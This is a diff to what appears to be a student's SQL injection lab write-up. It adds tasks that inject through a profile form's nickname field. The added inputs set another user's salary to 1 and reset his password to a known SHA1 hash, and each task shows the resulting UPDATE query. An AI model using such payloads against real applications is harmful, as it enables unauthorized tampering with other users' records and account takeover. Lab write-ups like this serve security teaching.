@@ -103,9 +103,47 @@ To do so, the parameters would be
 
 `phone numer: <anything>`
 
-With that, we reach the following sql coode:
+With that, we reach the following sql code:
 
 ```sql
 UPDATE credential SET
    nickname=’<nickname>’, salary = 1000000 WHERE nickname = <nickname>; -- email=’$input_email’, address=’$input_address’, Password=’$hashed_pwd’, PhoneNumber=’$input_phonenumber’ WHERE ID=$id;
+```
+
+### Task 3.2 - Reduce the Boby's salary
+
+`nickname: Boby', salary = 1 WHERE nickname = Boby; -- `
+
+`email: <anything>`
+
+`address: <anything>`
+
+`password: <anything>`
+
+`phone numer: <anything>`
+
+We reach the following query:
+
+```sql
+UPDATE credential SET
+   nickname=’Boby’, salary = 1 WHERE nickname = Boby; -- email=’$input_email’, address=’$input_address’, Password=’$hashed_pwd’, PhoneNumber=’$input_phonenumber’ WHERE ID=$id;
+```
+
+### Task 3.3 - Modify other people’ password
+
+For this example, assuming that we know that the password is hashed using the sha1 method, we can change the password manually. For instance, let's change the password of Boby to `banana`. If we consult [this site](http://www.sha1-online.com), we reach the hashed password, so we can see this:
+
+`nickname: Boby', password = '250e77f12a5ab6972a0895d290c4792f0a326ea8' WHERE nickname = Boby; -- `
+
+`email: <anything>`
+
+`address: <anything>`
+
+`password: <anything>`
+
+`phone numer: <anything>`
+
+```sql
+UPDATE credential SET
+   nickname=’Boby’, password = '250e77f12a5ab6972a0895d290c4792f0a326ea8' WHERE nickname = Boby; -- email=’$input_email’, address=’$input_address’, Password=’$hashed_pwd’, PhoneNumber=’$input_phonenumber’ WHERE ID=$id;
 ```
